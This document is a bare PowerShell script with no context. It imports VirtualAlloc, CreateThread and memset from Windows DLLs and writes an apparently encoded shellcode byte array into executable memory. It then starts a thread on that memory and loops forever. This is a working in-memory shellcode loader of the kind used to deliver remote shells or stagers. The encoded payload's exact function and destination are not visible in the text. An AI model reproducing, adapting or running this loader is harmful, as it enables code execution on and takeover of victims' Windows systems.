$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0xbe,0xb3,0x95,0xbf,0x3c,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0xa7,0x77,0x4a,0xc0,0x2f,0xf5,0xb5,0x39,0xaf,0x9a,0x3c,0xdc,0x9e,0x9a,0x5b,0x94,0xb0,0x2a,0x2f,0xf8,0x3c,0xc0,0x7d,0xe9,0xb7,0xa4,0xa9,0x1e,0x70,0x02,0x8c,0x11,0x81,0x3f,0xec,0x30,0x01,0x42,0x21,0x93,0x38,0x8d,0x34,0xd2,0x7d,0xf0,0xb5,0x86,0xd6,0x7e,0x6b,0x37,0x53,0xca,0xb0,0xbc,0x2f,0xda,0xb0,0x21,0xe7,0xdd,0x91,0xf7,0x7c,0x84,0x31,0xf9,0x51,0xbc,0x7b,0xe1,0xb6,0xf9,0x32,0x9a,0x0c,0x75,0xc5,0x4a,0x5d,0x76,0x6a,0xb3,0x52,0x85,0x72,0xf3,0x54,0x76,0x01,0x0d,0xa7,0x0b,0x12,0xca,0xda,0xd7,0x97,0xc9,0x7c,0x93,0x00,0x36,0x7d,0x70,0xd6,0xbd,0x71,0x3d,0x9c,0x9a,0x95,0xc0,0x71,0x91,0xa1,0x49,0x74,0x76,0x20,0x09,0x53,0x52,0x69,0xc9,0xfa,0xc3,0xd7,0xbc,0x03,0x13,0xb8,0x61,0xa6,0x5f,0x54,0x75,0xdb,0x3d,0x30,0xba,0xd6,0xbd,0xc0,0xd4,0x61,0xcd,0xf2,0x7b,0xda,0x59,0xbe,0xf4,0xc4,0x9e,0xc1,0x2e,0xb0,0x31,0x3c,0xd1,0xc1,0x18,0xfa,0x85,0x91,0x32,0x2b,0xa6,0x79,0xc3,0xd4,0x73,0x17,0xc6,0x42,0x11,0xa8,0xc1,0x99,0x81,0x2a,0xd2,0x8c,0x0d,0xa2,0x34,0xfe,0xfd,0xe4,0xe8,0xbe,0xad,0x44,0x59,0x56,0xa4,0x4a,0x86,0x46,0xc7,0x80,0xaf,0xec,0x28,0x7d,0x87,0x98,0xd1,0x24,0x53,0x39,0x1d,0xf3,0x19,0x79,0x95,0xf0,0xde,0x37,0x5e,0x7c,0xcd,0xaf,0xae,0xcb,0xaf,0x79,0xb0,0xe1,0xda,0x85,0x24,0x0e,0x4d,0xd2,0xd0,0x0c,0xa8,0x14,0x7f,0xee,0x9f,0x2f,0xb6,0x7a,0x60,0x47,0xb7,0x6a,0x60,0x97,0xe1,0xe0,0x60,0xff,0x55,0x51,0x33,0x1a,0x9a,0x4c,0x27,0xb7,0x0f,0x6f,0x1e,0x64,0x87,0x07,0x9c,0x53,0xef,0x87,0x5f,0xb6,0xf1,0xf4,0x89,0xfe,0x87,0x14,0x0a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};